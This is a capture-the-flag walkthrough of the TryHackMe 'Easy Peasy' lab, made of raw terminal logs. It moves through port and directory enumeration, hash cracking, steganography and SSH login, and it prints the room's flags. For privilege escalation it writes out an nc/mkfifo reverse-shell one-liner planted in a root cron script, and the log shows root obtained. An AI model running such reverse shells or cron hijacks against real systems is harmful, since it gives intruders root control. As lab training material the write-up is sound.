EASY_PEASY



ENUMERATION
"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ sudo nmap -p- --min-rate 1000 10.10.172.140            
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:33 EST
Warning: 10.10.172.140 giving up on port because retransmission cap hit (10).
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 77.47% done; ETC: 01:34 (0:00:19 remaining)
Nmap scan report for 10.10.172.140
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
6498/tcp  open  unknown
65524/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 82.87 seconds
                                                                                
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ sudo nmap -p 80 -sV 10.10.172.140   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:36 EST
Nmap scan report for 10.10.172.140
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
                                                                                
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ sudo nmap -sS -sV 10.10.172.140
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:36 EST
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.172.140
Host is up (0.17s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.37 seconds



"""



GOBUSTER

"""




┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ gobuster dir -u http://10.10.172.140/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.172.140/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 01:34:04 Starting gobuster in directory enumeration mode
===============================================================
Progress: 2008 / 220561 (0.91%)^C
[!] Keyboard interrupt detected, terminating.
                               
===============================================================
2022/02/28 01:34:13 Finished
===============================================================
                                                                                   
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ gobuster dir -u http://10.10.172.140/ -w /usr/share/wordlists/dirb/big.txt -t 60 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.172.140/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 01:34:31 Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.10.172.140/hidden/]
/robots.txt           (Status: 200) [Size: 43]                                    
                                                                                  
===============================================================
2022/02/28 01:35:34 Finished
===============================================================
                                                                                   
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ gobuster dir -u http://10.10.172.140/hidden/ -w /usr/share/wordlists/dirb/big.txt -t 60   
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.172.140/hidden/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 01:38:36 Starting gobuster in directory enumeration mode
===============================================================
/whatever             (Status: 301) [Size: 169] [--> http://10.10.172.140/hidden/whatever/]
Progress: 19840 / 20470 (96.92%)                                                   Progress: 19889 / 20470 (97.16%)                                                   Progress: 19958 / 20470 (97.50%)                                                   Progress: 20138 / 20470 (98.38%)                                                   Progress: 20313 / 20470 (99.23%)                                                   Progress: 20469 / 20470 (100.00%)                                                                                                                                             
===============================================================
2022/02/28 01:39:43 Finished
===============================================================



http://10.10.172.140/hidden/whatever/  ----> ZmxhZ3tmMXJzN19mbDRnfQ== ----> flag{f1rs7_fl4g}

WE SEE THAT THERE IS AN OTHER PORT LETS SEE WHAT SERVICES RE RUNNING 

"
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ sudo nmap -p 65524 -sV 10.10.172.140
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:41 EST
Nmap scan report for 10.10.172.140
Host is up (0.17s latency).

PORT      STATE SERVICE VERSION
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.47 seconds
                                                                                
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ sudo nmap -p 6498 -sV 10.10.172.140
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 01:47 EST
Nmap scan report for 10.10.172.140
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
6498/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.81 seconds
                                                           


"


LETS RUN GOBUSTER ON THE HTTP


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ gobuster dir -u http://10.10.172.140:65524/ -w /usr/share/wordlists/dirb/big.txt -t 60 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.172.140:65524/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/28 01:49:13 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 281]
                                               
===============================================================
2022/02/28 01:50:21 Finished
===============================================================


LETS SEE ROBOTS.TXT


"
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250 ---. MD5 hash --> flag{1m_s3c0nd_fl4g}
Allow:/
This Flag Can Enter But Only This Flag No More Exception

"

found at http://10.10.172.140:65524/ 

flag{9fdafbd64c47471a8f54cd3fc64cd312}

found <p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p> at http://10.10.172.140:65524/  source code

decode froom base 62

/n0th1ng3ls3m4tt3r


LETS GO TO THAT DIRECTORY


view-source:http://10.10.172.140:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg

found img and a hash
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81

"""

LETS ANALYZE IMG 


"""

FIND PHRASE 


LETS CRACK THE HASH 


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ john --format=gost   --wordlist=/home/kali/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy/easypeasy.txt direct.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)     
1g 0:00:00:00 DONE (2022-02-28 03:00) 12.50g/s 51200p/s 51200c/s 51200C/s mypasswordforthatjob..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ steghide extract -sf index.jpeg
Enter passphrase: 
wrote extracted data to "secrettext.txt".
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ ls
direct.txt  easypeasy.txt  index.jpeg  secrettext.txt  TASK_ANSWERS
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ cat secrettext.txt 
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ 


USERNAME = boring
Password = iconvertedmypasswordtobinary


"""

SSH



"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ ssh boring@10.10.172.140 -s 6498
ssh: connect to host 10.10.172.140 port 22: Connection refused
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ ssh boring@10.10.172.140 -p 6498
The authenticity of host '[10.10.172.140]:6498 ([10.10.172.140]:6498)' can't be established.
ED25519 key fingerprint is SHA256:6XHUSqR7Smm/Z9qPOQEMkXuhmxFm+McHTLbLqKoNL/Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.172.140]:6498' (ED25519) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized              **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.10.172.140's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
boring@kral4-PC:~$ 


ROT 13 encoded flag lets decode it 
flag{n0wits33msn0rm4l}



"""


PRIV ESC


"""


crontab

that run as root 


just put it in 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.80 7777 >/tmp/f


./myscretcronjob.sh

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Easy_Peasy]
└─$ nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.172.140] 36184
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
# ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
# cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
# 




"""